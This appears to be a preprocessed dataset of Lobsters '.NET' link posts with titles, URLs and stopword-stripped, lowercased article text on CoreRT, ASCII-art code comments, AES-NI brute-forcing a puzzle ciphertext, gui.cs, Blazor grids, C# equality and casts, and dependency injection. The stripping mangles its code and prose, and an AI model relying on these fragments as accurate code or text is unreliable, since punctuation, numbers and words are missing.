path look something like startup time improvement observed universal window apps net native translates workload type well startup time look like aspnet benchmark coreclr performance team us startup time matter much process longrunning like web server start matter end user exposed delay startup time time user stare hourglass cursor desktop app app load splash screen mobile app empty webpage web apptime first user instructionan interesting metric long take process creation time first line main executes lot thing need happen runtime execute first line code actually quite simple measure need ballpark number place call time linux getprocesstimes window api first line main api give information much work framework got around executing first line program language like c number typically first line program run o get chance update statistic building command line apps want number number add uphere time first instruction look like various net runtimes number corert zero app start fast app written ccompilation output sizesbig difference jit aot runtimes size selfcontained deployment corert benefit fact considered runtime net runtimes get written cc actually written c corert managed code linked away app use traditional runtimes runtime part represents fixed cost tailored app thanks setup aot deployment significantly smaller reflection thing get interesting reflection cpu care name method aot compiler free emit information reflection apis make possible locate type method field name provide access extra information entity signature method name method parametersthe corert compiler solves problem storing reflection information side information necessary run program emission optional call extra data reflection tax aot compiler let avoid paying using itwithout reflection data reflection experience becomes limited one still use typeof call objectgettype inspect base type implemented interface runtime still need make casting work list method field type name become invisiblereflection tax unexplored territory net since neither coreclr mono operate without il metadata omitting metadata option mainstream runtimes might door submegabyte deployment size especially important target like webassemblytraditionally ahead time compiled language unrestricted reflection net provides prove get work done without making everything available reflection lot thing people use reflection day like serialization deserialization done without reflection build task compile time build task actually provides benefit justintime runtimes reflection slowhow dynamic code net provides several facility let generate new code runtime reflectionemit assemblyloadfrom even something simple makegenerictype makegenericmethod pose challenge aot runtime thing done ahead time definition least done program aot runtime forced justintime loading well important thing aotfirst runtime one need pay justintime cost explicitly use dynamic feature call dynamic apis runtime overheadcorert currently prototype interpreter prototype jit showing dynamic code limiting factor runtime designed aotso corert anyway corert experimental crossplatform open source net runtime specialized aot compilation corert whole experimental label many part corert shipping supported product corert take part net native part coreclr put together rough percentage thing corert share coreclr net native picture leftthanks setup corert get improved every time someone improves corelib coreclr implement new optimization ryujitif would like give corert try publish net core app corert simply adding new nuget package reference instruction herejit aot gasoline engine electric enginethe performance characteristic ahead time compiled time compiled runtimes compared characteristic electric gasoline engine carelectric motor generate motion heat justintime compiled net app spend considerable amount resource thing support running code actually running codeat lower speed electric motor deliver torque gasoline engine make much better acceleration aot compiled app peak throughput available immediately app running full speed right away gasoline engine outperform electric engine eventually highoctane justintime compiled runtimeelectric motor simpler one look highoctane justintime compiled runtime dynamic recompilation tiered jitting stack replacement lot complexity start show complexity make thing harder developer runtime also user runtime flavor native code running production depends dynamic tuning runtime performed based past characteristic programboth gasoline electric engine use place nice option available good net
157,Lobsters,dotnet,"C#, F#, .NET programming",ASCII Art in .NET Code,https://mattwarren.org/2019/04/25/ASCII-Art-in-.NET-Code/,ascii art net code,ascii art net code dotnet run hello world interesting ascii art dotnetcoreclr mono dotnetcorefx dotnetroslyn aspnetaspnetcore note john regehr explaining code using ascii art come across interesting example missed please let know table content dave cutler dave cutler coreclrsrcvmthreadsuspendcpp internet interest dave cutler dave cutler engineer engineer computer industry luminary salute dave cutler fivedecadelong quest quality syntax tree coreclrsrcjitlsracpp coreclrsrcjitmorphcpp roslynsrccompilersvisualbasicportablesemanticstypeinferencerequiredconversionvb timeline coreclrsrcvmcomwaithandlecpp logic table coreclrsrcvmmethodtablebuildercpp coreclrsrcjitimportercpp operator overloading converted class hierarchy coreclrsrcvmobjecth even larger one stack walking net runtime component diagram coreclrsrcvmcodemanh coreclrsrcvmceeloadcpp native image generator ngen algorithm roslynsrcworkspacescoreportableutilitieseditdistancecs corefxsrcsystemiofilesystemsrcsystemioenumerationfilesystemnamecs roslynsrcworkspacescoreportablesharedcollectionsintervaltree bit packing roslynsrccompilerscsharpportablesymbolssourcesourcemembercontainersymbolcs corefxsrcsystemruntimewindowsruntimesrcsystemthreadingtaskstasktoasyncinfoadaptercs data structure monoutilsdlmallocc corefxsrccommonsrccorelibsystemmemoryextensionscs state machine monobenchmarkzipmarkcs rfc deflate compressed data format specification coreclrsrcjitjitehcpp rfc spec kestrel webserver rfc hypertext transfer protocol version rfc uniform resource identifier uri rfc hpack header compression date time date time hard corefxsrccommonsrccorelibsystemtimezoneinfocs corefxsrccommonsrccorelibsystemtimezoneinfounixcs corefxsrcsystemruntimetestssystemtimezoneinfotestscs stack layout coreclrsrcjitlclvarscpp arm mips ppc arm covering callback involving funclet frame rest,ascii art net code apr word like nice bit ascii art know certainly see matt clr watch recording talk dotnet run hello world armed trusty regex r n n n set find interesting ascii art used source code comment following net related repository dotnetcoreclr runtime net core includes garbage collector jit compiler primitive data type lowlevel class mono open source ecma cli c net implementation dotnetcorefx foundational class library net core includes type collection file system console json xml async many others dotnetroslyn provides c visual basic language rich code analysis apis aspnetaspnetcore crossplatform net framework building modern cloudbased web application window mac linux note yes shamelessly borrowed idea john regehr motivated write excellent post explaining code using ascii art net related code come across interesting example missed please let know table content make example easier browse split category dave cutler art one deserves category quote amazing dave cutler led development window nt therefore better person ask deep technical question thread suspension work window coreclrsrcvmthreadsuspendcpp message david cutler suspendthread return suspended thread continue execute code user mode david cutler suspended thread execute user code might currently running logical processor whose logical processor currently actually executing another thread case target thread suspend hardware switch back executing instruction logical processor case even memory barrier would necessarily work better solution would use interlocked operation variable suspendthread return store buffer cpu suspended thread still need drain historically assumed answer question one hyperthreaded machine running build seen two stress failure suspendthread return writes seem still flight usually suspend thread call getthreadcontext seems guarantee consistency place would like avoid getthreadcontext safe legal david cutler get context delivers apc target thread wait event set target thread delivered context chris info dave cutler see excellent interview internet interest dave cutler dave cutler engineer engineer computer industry luminary salute dave cutler fivedecadelong quest quality syntax tree inner working net justintime jit compiler always bit mystery informative comment like one coreclrsrcjitlsracpp go way showing example tree number execution order lower earlier higher later gtadd x tree generate tree gtadd gtreload x tree also indepth example coreclrsrcjitmorphcpp also roslynsrccompilersvisualbasicportablesemanticstypeinferencerequiredconversionvb restriction form partial order composed three chain le strict strict reverse chain none anyreverse reversereference identity middle chain none anyreverse anyconversionandreverse identity forward chain none arrayelement reference identity key identity r reference r r r reversereference anyconversionandreverse arr arr arrayelement anyreverse none none none timeline example coreclrsrcvmcomwaithandlecpp unique find another example ascii art used illustrate timeline really novel approach case clr paused inbetween wait method calculates much wait adjusted account clr freeze essentially pause duration considered time never existed two case exists consider sec wait issued case pause happened wait completes hence pause time need added back end wait pause additional sec wait case pause ended wait completes second wait left pause started need add back pause additional sec wait case expressed calculation pausetime sum pause triggered timer started expduration expected duration wait without pause example actduration time wait finished since clr frozen pause max timeout pauseend logic table sweetspot ascii art seems table many example starting coreclrsrcvmmethodtablebuildercpp bonus point combining comment code together base type subtype mdprivatescope mdprivate mdfamandassem mdassem mdfamily mdfamorassem mdpublic mdprivatescope esm eno eno eno eno eno eno mdprivate esm eye eno eno eno eno eno mdfamandassem esm eye esa eno eno eno eno mdassem esm eye esa esa eno eno eno mdfamily esm eye eye eno eye ensa eno mdfamorassem esm eye eye esa eye eye eno mdpublic esm eye eye eye eye eye eye also coreclrsrcjitimportercpp show jit deal boxingunboxing helper corinfohelpunbox corinfohelpunboxnullable return byref return struct opcode unbox push byref spill struct local push byref local unboxany push gtobj push struct byref linux struct returned two register create temp address passed unboxnullable helper finally nice example showing rule operator overloading c roslyn compiler net datatypes converted via systemtoxxx function class hierarchy course ide come tool generate classhierarchies much nicer see ascii coreclrsrcvmobjecth com internal object model object common base part com object contains methodtable pointer sync block index negative offset code stringobject string object specialized object string storageretrieval higher performance baseobjectwithcacheddata object plus one object field caching reflectclassbaseobject base object runtimetype class reflectmethodobject base object runtimemethodinfo class reflectfieldobject base object rtfieldinfo class code arraybase base portion array base type array ptrarray array objectrefs different base array pobjectclass code assemblybaseobject base object class assembly also even larger one stumbled across writing stack walking net runtime component diagram several different component codebase always nice see fit together coreclrsrcvmcodemanh see toplevel part net jit work together executionmanager codetype codetype v v v v r r icorjitcompiler ijitman r icorjitcompiler ijitman r r r x x v v r r icodeman icodeman rangesections notable example finally coreclrsrcvmceeloadcpp see innerworkings native image generator ngen diagram illustrates layout fixups ngen image case function classrestore fixup class bdll zapbasecurtablevarva fixuplist see fixup encoding mpfixupblobs pentry va nonnull handle zapheaderimporttable nonnull nonnull adll class cctors p va blob nonnull class restore bdll nonnull blob pblob index nonnull nonnull various fixups need happen corcompiletokentable pentryend va algorithm say picture paint thousand word definately applies describing complex algorithm roslynsrcworkspacescoreportableutilitieseditdistancecs fill matrix fully get u n source u r next gem explains do wildcard matching work corefxsrcsystemiofilesystemsrcsystemioenumerationfilesystemnamecs matching routine description copied native impl routine compare dbcs name expression tell caller name language defined expression input name contain wildcards expression may contain wildcards expression wild card evaluated shown nondeterministic finite automaton note dosstar dosqm dosstar dosqm dosdot x e x x e x x x x x eof x x eof single character single character except final e null character transition eof end name string word match character match exactly character dosstar match character encountering matching final name dosqm match single character upon encountering period end name string advance expression end set contiguous dosqms dosdot match either zero character beyond name string finally roslynsrcworkspacescoreportablesharedcollectionsintervaltree permethod comment sample great idea sample b b c b c c internal node innerrightouterleftrotation iintervalintrospector introspector sample c b c b c b internal node innerleftouterrightrotation iintervalintrospector introspector bit packing maybe visualise individual bit set given hexadecimal value always grateful comment like one roslynsrccompilerscsharpportablesymbolssourcesourcemembercontainersymbolcs current pack everything two ints layout given first int dyyxxxxxxxxxxxxxxxxxxxxxxxwwwwww w special type bit x modifier bit ismanagedtype bit fielddefinitionsnoted bit one corefxsrcsystemruntimewindowsruntimesrcsystemthreadingtaskstasktoasyncinfoadaptercs also great job showing different bitflags interact diagram illustrates constant update updating constant x reserved use worry negativevalued state constant x stateflagcompletedsynchronously x stateflagmustruncompletionhndlwhenset x stateflagcompletionhndlnotyetinvoked statenotinitialized x statestarted x stateruntocompletion x statecancellationrequested x statecancellationcompleted x stateerror x stateclosed xxxxxx statemaskselectanyasyncstate xxxxxxxxxxxxxxxxxxxxxxxxxx statemaskclearallasyncstates finally helpful explanation different encoding work firstly byte bit representation surrogate real unicode value highsurrogate lowsurrogate word bit representation xxxxxxxx xxxxxxxx hhhhhhll llllllll surrogate real unicode value highsurrogate lowsurrogate data structure comment monoutilsdlmallocc great job showing chunk memory arranaged malloc chunk use look like chunk size previous chunk p p size chunk mem size sizeof sizet available payload byte chunk size next chunk may may use mem free look like chunk user payload must use would merged p size chunk mem next pointer prev pointer size sizeof struct chunk unused byte chunk size chunk size next chunk must use would merged mem user payload also corefxsrccommonsrccorelibsystemmemoryextensionscs see overlapping memory region detected visually two sequence located somewhere address space follows normal address space first sequence xref xref xlength second sequence yref yref ylength relative address space first sequence second sequence state machine comment monobenchmarkzipmarkcs give great overview implementation rfc deflate compressed data format specification deflater following state transition initstate initfinishingstate v setdictstate setdictfinishingstate v v v v busystate finishingstate v finishedstate v closedstate produce header start initstate otherwise start busystate dictionary may set initstate change state indicated whether dictionary set first call deflate change busystate intentionally left blank finishingstate entered flush called indicate input also state indicating header nt written yet finishedstate entered everything flushed internal pending output buffer time might pushing definition state machine bit far wanted include show complex exception handling coreclrsrcjitjitehcpp fgnormalizeeh enforce following invariant block first block handler first block try il entry function happen try nested handler example consider thus start start block transform empty block rfc spec next kestrel webserver handle rfc hypertext transfer protocol version firstly http length type flag r stream identifier frame payload http pad length e stream dependency weight header block fragment padding notable example also rfc uniform resource identifier uri discussed finally rfc hpack header compression covered http index private const byte indexedheaderfieldmask private const byte indexedheaderfieldrepresentation http index private const byte literalheaderfieldwithincrementalindexingmask private const byte literalheaderfieldwithincrementalindexingrepresentation http index private const byte literalheaderfieldwithoutindexingmask private const byte literalheaderfieldwithoutindexingrepresentation http index private const byte literalheaderfieldneverindexedmask private const byte literalheaderfieldneverindexedrepresentation http max size private const byte dynamictablesizeupdatemask private const byte dynamictablesizeupdaterepresentation http h string length private const byte huffmanmask date time pretty widely accepted date time hard reflected amount comment explaining different scenario example corefxsrccommonsrccorelibsystemtimezoneinfocs starttime endtime represent period either start dst end include potentially overlapped time pacific standard time april october hr hr invalid time ambiguous time dst weird time zone april october hr hr ambiguous time invalid time dst also corefxsrccommonsrccorelibsystemtimezoneinfounixcs see detail leapyears handled n julian day format nt support specifies julian day n february counted leap year n would relative number begining year handle year leap year leap year n would counted jan feb mar dec non leap year jan feb mar dec example n specified mean leap year rule start mar non leap year rule start mar need support n format floating adjustment rule support case finally comment corefxsrcsystemruntimetestssystemtimezoneinfotestscs discus invalid ambiguous time covered test march october hr hr invalid time ambiguous time dst sunday march universal convert sunday march europeamsterdam dst sunday march universal convert sunday march europeamsterdam dst stack layout finish wanted look stack layout seem favourite netmono runtime engineer sooo many example firstup coreclrsrcjitlclvarscpp also see arm version frame laid follows esp frame incoming argument virtual return address callee saved register temp variable ambient esp argument next function stack grows downward v ebp frame incoming argument virtual return address incoming ebp ebp callee saved register security object paramtypearg lastexecutedfilter shadow sps variable temp localloc ambient esp argument next function stack grows downward v left mono nice example covering mips ppc arm stack frame layout sp cfg stackusage cfg paramarea param area incoming sp cfg stackusage mipsstackparamoffset incoming sp cfg stackusage ra sp cfg spilled regs sp monolmf structure optional sp cfg archlmfoffset saved register sp cfg archiregsoffset local sp cfg paramarea param area outgoing sp mipsstackparamoffset outgoing sp red zone finally another example covering dllimport callback one involving funclet frame told lot rest sick ascii art example look coreclr roslyn corefx aspnetcore mono
158,Lobsters,dotnet,"C#, F#, .NET programming",AES-NI (.NET) - Outperforming C and OpenSSL,https://ndportmann.com/aes-ni-outperforming-c-and-openssl/,aesni net outperforming c openssl,first post second post challenge http solid baseline first post best bang buck time spent handling converting raw byte first post improvement flexing intrinics muscle first post total runtime approach spent creating instance second post faster second post aesni second post another improvement mode operation nemanja mijailovic excellent post m showing adam sitnik tr main takeaway,third last post small series aesni net core hardware intrinsics please also look first post second post challenge message want crack decrypted message contain instruction knowns algorithm aes rijndael blocksize keysize need find first byte key rest byte key integer value initialization vector encoded text plain ascii english encrypted text encoded trustpilot development team biting red pill trustpilot http solid baseline first post series analyzed straightforward implementation aes bruteforce attack known ciphertext task hand requires u decrypt given ciphertext different key yield humanreadable plaintext roughly operation determine whether plaintext produced bruteforce attack humanreadable search string trust expect part plaintext care solving challenge cited may source come nothing wrong may however slightly offended realize execution time referenced c snippet order magnitude slower c counterpart read end beating c counterpart available lot source code started look close following snippet private static readonly aes cipher bool innerloop byte ciphertext byte key byte iv var decryptor ciphercreatedecryptor key iv string cleartext using var m new memorystream ciphertext using var c new cryptostream m decryptor cryptostreammoderead using var sr new streamreader c cleartext srreadtoend return cleartextcontains trust full source best bang buck analyzing initial approach challenge realized time spent handling stream converting raw byte string transforming source code version reuses byte target decrypt operation relatively straightforward translating string trust byte ascii value make use indexof defined span byte easy enough well help avoid conversion plaintext string using two optimization alone able reduce runtime measurement first post showed use time decrypt search string trust excellent reduction overhead rewarded improvement runtime private static readonly aes cipher private static readonlyspan byte trust new byte bool innerloop byte ciphertext byte plaintext byte key byte iv var decryptor aescreatedecryptor key iv decryptortransformblock ciphertext ciphertextlength plaintext return plaintextasspan indexof trust full source flexing intrinics muscle end first post realized roughly total runtime approach spent creating icryptotransform instance everchanging aes key bruteforce code second post focused purely aes key expansion using hardware intrinsics intel aesni upcoming release net core get direct access sort hardware intrinsics via systemruntimeintrinsics namespace aes key expansion implemented almost entirely using two instruction aeskeygenassist aesimc inversemixcolumns calculate decryption round key check example implementing aes key expansion plain c leveraging aesni instruction well instruction able calculate round key faster time required create icryptotransform instance example closing word second post presented recipe turning cc code using intel intrinsics c using recipe translated aes ecb cbc gcm two intel whitepapers found c source code well bunch generalpurpose benchmark available aesni repository aes implementation let u use round key calculated described second post directly getting rid framework overhead encrypt decrypt round key loaded xmm register plaintext block also loaded sequentially register processed togethger round key second operand aesencaesdec aesenclastaesdeclast instruction encrypt method serf nice illustration procedure may notice source code look bit weird array loop avoided manually unrolled increase performance method unfortunately net core jit yet smart enough perform kind unrolling result incredible achieve yet another improvement approach point outperform openssl based bruteforce code written c luckily task hand focus decryption aescbc encryption one mode operation pipelined parallelized pipelining aes operation execute multiple aesencaesdec instruction using multiple block round key seen instruction data independent performed parallel cpu least extent interested optimization internals aes implementation give repository visit make sure read nemanja mijailovic excellent post implementing aes served inspiration work full source m showing optimize singlethreaded code parallelize adam sitnik bruteforce task described easily parallelized could example spawn thread testing key first byte fixed value spawning thread core precisely hyperthreads available machine profitable directly bound hardware performing aes operation machine would therefore better spawn thread trying key starting respectively last thread ending bit work others exactly able break ciphertext workstation tr macbook parallelize workload could used parallelfor one friend tpl series removing overhead adding decided full source main takeaway series blog post shown net core excellent platform developer productivity straightforward get thing done relatively line code care performance little change existing code enough improve thing quite drastically finally every clock cycle matter enough lowlevel primitive disposal create solution capable outperforming native code essential tip take away avoid use overheadheavy construct eg icryptotransform stream hot path avoid unnecessary conversion data format try reuse buffer byte array instead allocating loop make use framework excellent vectorized function span time invest utilizing hardware intrinsics performance critical percent application let close benchmark result singleshot coldstart performance various method compared throughout post method workstation macbook fworiginal fwoptimized aesnioriginal aesniparallel
159,Lobsters,dotnet,"C#, F#, .NET programming",Revisting the gui.cs framework,https://tirania.org/blog/archive/2019/Apr-22.html,revisting guics framework,blog revisting guics framework blog post hyped curse binding would start moonlight back future http githubcommigueldeicazaguics conceptual api documentation widget layout start minute copy slide http,blog revisting guics framework year ago wrote small ui library build console application unix using c enjoyed writing blog post hyped tiny library platform rich internet application ria young among might know back ria platform rage like bitcoin two year ago blog post written tongueincheek style linked actual screenshots toy library revealed joke day realized folk read whole blog post clicked screenshot link received three piece email first executive adobe asking competing rather partnering ria framework back adobe famous building flash flex platform two leading ria system industry second journalist trying find detail new web framework interested getting phone discus detail announcement third piece industry analyst wanted understand announcement strategic placement employer fivedimensional industry tracking megadeltoid tiny library part curse binding mono time dreamed writing bringing complete terminal stack net copious spare time little know run time little le month would start moonlight open source clone microsoft silverlight would consume time couple year back future silverlight might died desire ui toolkit console application net fourteen month ago decided work guics screenshot result many way world changed expect fairly modern version curse available across unices unix system proper terminfo database installed hopeless romantic called new incarnation ui toolkit guics time around updated modern net idiom modern net build system embraced uikit design internals framework azure devops run continuous build manage release nuget addition toolkit longer tied unix contains driver window console net systemconsole le powerful version window console ncurses library find result github http githubcommigueldeicazaguics install favorite operating system installing terminalgui nuget package published conceptual api documentation folk get started hopefully beat previous record two user original layout system guics based absolute positioning bad quick hack time around wanted something simpler use sadly uikit good source inspiration simple use layout system came novel system widget layout one quite fond new system introduces two data type po specifying position dim specifying dimension developer assign po value x dim value width height system come range way specifying position dimension including referencing property view specify layout way similar specifying formula spreadsheet one hour long presentation introducing various tool console programming net section dealing guics start minute also get copy slide http
160,Lobsters,dotnet,"C#, F#, .NET programming",Why Blazor Grid Templates Will Make You Question Everything,https://www.telerik.com/blogs/why-blazor-grid-templates-will-make-you-question-everything,blazor grid template make question everything,telerik ui blazor template type column template editor template row template telerik ui blazor grid image template custom form built grid editor masterdetail view conclusion dropdownlist download latest release demo repository github try telerik ui blazor,native component telerik ui blazor grid template fully utilize best feature blazor highly customize user experience using template application implies creating custom experience user leveraging component framework working telerik ui blazor component native built ground using blazor framework tap directly blazor best feature grid component template fully utilize html razor component completely customize user experience article see overview template available simple use case use building block see dynamic blazor grid using template advanced idea like custom editor masterdetail view template type currently three type template available blazor grid column template editor template row template specific us powerful tool adapting grid specific need let start quick introduction template type column template default grid render value field column exactly provided data source override behavior using column template allows u take control rendering object within column template provides entire object currently bound row column exists object template context template apply custom formatting insert additional html image display razor component using value context telerikgridcolumn field nameof sampledataname title employee name template employee name context sampledata name template telerikgridcolumn column template visible current row edit mode customize grid editing experience use editortemplate editor template editortemplate template bound editing context editortemplate defines inline template component rendered user editing field although editortemplate act much like column template shown given row edit mode telerikgridcolumn field nameof employeevacationdays title position editortemplate var employeetoupdate context employee kendonumerictextbox decimal format day max min step value employeetoupdatevacationdays editortemplate telerikgridcolumn column editor template give excellent control column rendering grid even control choose use row template completely customize grid row template unlike previously mentioned template rowtemplate span entire grid column row template allows define custom rendering entire tr element record convenient want use template column requires le markup setting individual template many column since template nt bound specific column use context attribute rowtemplate set name context variable type model type grid bound rowtemplate context employee td span employeeid span td td hired stringformat dd mmm yyyy employeehiredate td rowtemplate telerikgridcolumns telerikgridcolumn field nameof sampledataname title employee name telerikgridcolumn field nameof sampledatahiredate title hire date telerikgridcolumns using three template type tackle wide variety requirement let look flexible telerik ui blazor grid accomplish might surprise image template begin simple yet common scenario embedding image grid column let assume list user need manage broad range detail nice associate face name column template using column template use one many value currently bound item property generate image element display image directly column example assume product image stored server relative path image image file name corresponds productid let begin without template see grid structured without customization telerikgrid data griddata height telerikgridcolumns telerikgridcolumn field nameof productproductname title product name telerikgridcolumn field nameof productunitprice title unit price telerikgridcolumns telerikgrid function public ienumerable product griddata get set protected override void oninit griddata fetch data basic two column grid text display product name unit price using template transform product name column display image alongside product name access template product name column need telerikgridcolumn component matching beginend tag inside component add template component define custom rendering inside template access context object current product scope simple cast context product give u access proper type telerikgridcolumn field nameof productproductname title product name template var product context product template telerikgridcolumn current product render see fit within column let add html img tag create path productid property apply cs image using standard html markup class roundedcircle also since razor c string literal valid way formating path src image productproductid jpg also display product name property along side image using simple markup telerikgrid data griddata height telerikgridcolumns telerikgridcolumn field nameof productproductname title product name template var product context product img class roundedcircle src image productproductid jpg span productproductname span template telerikgridcolumn telerikgridcolumn field nameof productunitprice title unit price telerikgridcolumns telerikgrid function underlying razor component framework support template telerik ui blazor grid built using framework native architecture grid fully capable solution many problem custom form template fully utilize blazor framework feature inside template add component logic even trigger event addition template nt scoped component contained access event value outside template well open new possibility creating custom experience let assume want create custom edit experience versus using one built grid editor give u full control every aspect form challenge getting form interact grid make custom editor need select item place property form savecancel change surface might seem like complex task however framework extremely flexible data binding mechanic identifying currently selected object would provide need accomplish task since bind property directly form element grid template give u access item bound grid row need method selecting value creating reference object let start creating placeholder object reference using field named selectedproduct create easy way selecting product column template button suffice button clicked invoke inline function set selectedproduct current context telerikgridcolumn field nameof productproductid title id template telerikbutton icon edit onclick selectedproduct product context edit telerikbutton template telerikgridcolumn data referenced add form display information provide save cancel action form exist outside grid since object reference scoped page place form anywhere outside grid form hidden shown based item selected using standard razor block selectedproduct null form saving canceling edit also straightforward task need create button corresponding onclick event cancel edit selectedproduct reference simply reset null telerikgrid data griddata height height pageable true pagesize pagesize telerikgridcolumns telerikgridcolumn field nameof productproductid title id template telerikbutton icon edit onclick selectedproduct product context edit telerikbutton template telerikgridcolumn telerikgridcolumn field nameof productproductname title product name telerikgridcolumn field nameof productunitprice title unit price telerikgridcolumns telerikgrid hr selectedproduct null div class formgroup label class controllabel productname product name label input class formcontrol bind selectedproductproductname id name name name type text div div class formgroup label class controllabel unitprice unit price label input class formcontrol bind selectedproductunitprice id unitprice name unitprice type number div div class formgroup div telerikbutton icon save class kprimary onclick save save telerikbutton telerikbutton icon cancel onclick selectedproduct null cancel telerikbutton div div function product selectedproduct void save save logic selectedproduct null ability share state component page opportunity template driven experience unlimited masterdetail view using template completely transform entire grid row custom html razor even component next example look advanced get template adding masterdetail view grid likely scenario application one data point many property varying importance property always front center others might helpful within reach masterdetail view quite handy type view help keep extended data view requested user keeping critical data front time using rowtemplate define two different state row easily toggled simple button click start default state display two column data view nicely tucked away custom component called productmastertemplate take parameter product displayed two column format productmastertemplate product product addition use complex view reveal data given product list view encapsulate view custom component called productdetailtemplate productdetailtemplate product product within custom component table data cell td contain razor code displaying property given product content row template must td element number total colspan must match number column defined grid internally template contain markup similar following example td productproperty td td colspan view logic td two state clearly defined component focus switching two let begin defining item selected creating variable hold reference selected product name selectedproduct enable user toggle view need set button display user show detail simply check selectedproduct see match current item row since using blazor easily set state selectedproduct directly event handler inline function onclick selectedproduct rowtemplate context product selectedproduct product td telerikbutton icon iconnamewindow onclick selectedproduct product detail telerikbutton td productmastertemplate product product else td telerikbutton icon iconnameclose onclick selectedproduct null close telerikbutton td productdetailtemplate product product rowtemplate completed code actually quite simple due combination template component architecture telerikgrid data griddata height height rowtemplate context product selectedproduct product td telerikbutton icon iconnamewindow onclick selectedproduct product detail telerikbutton td productmastertemplate product product else td telerikbutton icon iconnameclose onclick selectedproduct null close telerikbutton td productdetailtemplate product product rowtemplate telerikgridcolumns telerikgridcolumn width field nameof productproductname title product telerikgridcolumn field nameof productproductname title product name telerikgridcolumn field nameof productunitsinstock title unit price telerikgridcolumns telerikgrid function product selectedproduct clicking detail button give u slick ui allows u drill grid data conclusion telerik ui blazor component native built ground using blazor framework tap directly blazor best feature grid component template fully utilize html razor component completely customize user experience simple template useful formatting displaying image extensive template transform user interface completely adding entirely new functionality grid post focused grid however component like dropdownlist already feature template field well make sure download latest release try template using demo repository github try telerik ui blazor
161,Lobsters,dotnet,"C#, F#, .NET programming",Diabolical Interfaces,https://www.kylesletten.com/2019/04/18/diabolical-interfaces.html,diabolical interface,comparable icomparable iequatable object comparable icomparable iequatable nt,every graduating student able tell interface defines method implemented class creates isa relationship class implement going talk today interface possible implement general case comparable icomparable iequatable object lumping together even though different signature object nt even interface share flaw show wrong interface interface iscomparable bool isequalto iscomparable simplest possible implementation object generally class object iscomparable bool isequalto iscomparable return instance straightforward implementation however really work implementation bizarre edgecases say define method string class string iscomparable char char bool isequalto iscomparable nt string return false return thischars otherchars seems like work ok want compare string without casing well let make new class override behavior class ignorecasestring string iscomparable bool isequalto iscomparable nt string return false return thischars otherchars compared without case problem arises isequalto longer commutative name string kyle sletten name ignorecasestring kyle sletten name isequalto name true name isequalto name false wait fix class string iscomparable char char bool isequalto iscomparable nt string return false derived type string return isequalto return thischars otherchars class ignorecasestring string iscomparable bool isequalto iscomparable nt string return false derived type ignorecasestring return isequalto return thischars otherchars compared without case ok let add another test case name string kyle sletten name ignorecasestring kyle sletten name string kyle sletten name isequalto name true name isequalto name true name isequalto name false name isequalto name true isequalto nt transitive world coming becomes clear way one implementation isequalto without weirdness require two type always exactly equal class string iscomparable char char bool isequalto iscomparable nt string derived type return false return thischars otherchars class ignorecasestring string iscomparable bool isequalto iscomparable nt ignorecasestring derived type return false return thischars otherchars compared without case comparable icomparable iequatable never fear generic let make interface generic comparing type everything ok interface iscomparableto bool isequalto class string iscomparableto string char char bool isequalto string return thischars otherchars class ignorecasestring string iscomparableto ignorecasestring bool isequalto ignorecasestring return thischars otherchars compared without case static dispatch work well nt name string kyle sletten name ignorecasestring kyle sletten name isequalto name true name isequalto name true name isequalto name string false need extra dynamicish stuff class ignorecasestring string iscomparableto ignorecasestring bool isequalto string ignorecasestring return isequalto ignorecasestring return stringisequalto bool isequalto ignorecasestring return thischars otherchars compared without case yeah name string kyle sletten name ignorecasestring kyle sletten name isequalto name true name isequalto name true name isequalto name string true yet comparison work world set right except silly extra ignorecasestring nt really need mean need create new object want compare string using ignorecasestring lost ability compare different thing seems nt would represent iscomparable decided nt want try get work right simpler iscomparable would work better interface cancompare bool areequal left right ignorecase cancompare string string bool areequal string left string right return leftchars rightchars compared without case exactly c ultimately added address issue brought post standard library type accept object decide comparison dictionary etc public dictionary systemcollectionsgenericiequalitycomparer tkey comparer
163,Lobsters,dotnet,"C#, F#, .NET programming",When redundant type casts matter,https://fuglede.dk/en/blog/when-redundant-type-casts-matter/,redundant type cast matter,last episode background staticallytyped convert try example explanation reported behaviour previous post ecma specification c microsoft version comment add comment create user,last episode rabbit hole broken dream despair trying make deterministic floating point operation net saw seemingly innocent series operation would lead behaviour would depend target architecture compiler optimization settingsthis time around see even microsoft main c editor visual studio nt quite get right according visual studio redundant operation c cause result changebackgroundc staticallytyped variable compiletime verification help ensure algorithm behave correctly example ensuring one use string function expects integermoreover certain condition possible convert type variable type example int possible convert int type variable long either implicitly long b explicitly long c long try conversion possible instance convert string int mathematically minded may appreciate fact specification explicitly spell identity conversion always possible type converted thing get bit weirdthe examplelet u return example previous post changed ever slightly float float double double float consolewriteline consolewriteline perform simple operation singleprecision floatingpoint number convert result doubleprecision two different way print result thing pay attention explicit cast float perform identity conversion float converting type float one would expect nothing would contain value yet building program target architecture release mode running one get following rather surprising much visual studio stumble claim cast redundant explanationwe reported behaviour possible bug visual studio code analyzer subsequent discussion reveals going herein previous post saw local variable float really mean singlepoint precision higher digging ecma specification c one find explicit cast effectively change meaning float exactly singlepoint precision case identity conversion effect runtime however since floating point operation may performed higher precision prescribed type assignment result may result loss precision explicit cast guaranteed reduce precision prescribed typesomewhat curiously microsoft version specification contains exact text ecma version except leaf crucial point identity conversion floatingpoint typescommentsno comment yetadd commentto avoid much spam log add comment create user nt already one use photo login well
164,Lobsters,dotnet,"C#, F#, .NET programming",From dependency injection to dependency rejection,https://blog.ploeh.dk/2017/01/27/from-dependency-injection-to-dependency-rejection/,dependency injection dependency rejection,dependency injection net comic john muellerleile igal tabachnik dependency injection passing argument partial application dependency injection dependency rejection pure interaction functional architecture f available github available github next dependency injection passing argument,problem typically solved dependency injection objectoriented programming solved completely different way functional programming several year ago wrote book called dependency injection net published book contains example c since increasingly become interested functional programming extend consider f primary language combination wonder people often ask dependency injection functional programming seen one answer people explaining partial function application equivalent dependency injection small series article explain true also functional conclude showing functional alternative decoupling logic side effect comic courtesy john muellerleile igal tabachnik another school functional programmer believe dependency injection functional programming involves free monad often make le though experience usually enough refactor unit take direct input output compose impurepureimpure sandwich see example later article series contains following part dependency injection passing argument partial application dependency injection dependency rejection pure interaction first three article revolve around common example one favourite scenario online restaurant reservation see actual example client functional architecture f pluralsight course somewhat dated client source code available github serverside f haskell example code article series available github scenario implement httpbased api accept incoming json document represent restaurant reservation fourth article pure interaction gateway another article series free monad point nowhere article series reject dependency injection set objectoriented pattern objectoriented programming dependency injection wellknown comprehensively described way achieve decoupling testability next article see brief review dependency injection c next dependency injection passing argument
